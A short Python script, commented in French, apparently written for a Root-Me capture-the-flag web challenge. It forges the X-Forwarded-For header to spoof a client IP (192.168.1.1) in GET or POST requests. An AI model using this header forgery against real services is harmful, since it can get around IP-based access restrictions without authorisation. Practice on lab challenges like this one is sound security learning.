"""
Script pour faire une requete get ou post en spoofant une ip

"""
import requests
from models.webRessource import headers_base as headers


def spoof_ip_request(url, ip_spoofed,post_r=False, data={}):
    headers["X-Forwarded-For"] = ip_spoofed
    if post_r:
        r = requests.post(url, headers=headers, data=data)
    else:
        r = requests.get(url, headers=headers)
    return r.content


if __name__ == "__main__":
    url = 'http://challenge01.root-me.org/web-serveur/ch68/'
    ip_spoofed = "192.168.1.1"
    print(spoof_ip_request(url, ip_spoofed).decode())
